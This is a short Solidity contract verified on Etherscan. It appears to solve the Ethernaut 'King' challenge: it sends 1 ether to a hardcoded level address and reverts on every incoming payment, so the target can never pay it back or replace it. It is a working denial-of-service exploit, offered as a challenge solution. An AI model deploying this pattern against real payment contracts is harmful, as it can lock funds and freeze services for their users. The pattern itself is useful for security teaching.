/**
 *Submitted for verification at Etherscan.io on 2021-12-29
*/

pragma solidity ^0.6.0;

contract KillKing {
    address payable levelInstance = 0x8a52D9D0083E6280f6b4fae26fe818C7539e930c;

    function payMe() public payable {
        
    }

    function kill() public payable {
        levelInstance.transfer(1 ether);
    }

    receive() external payable {
        revert();
    }
}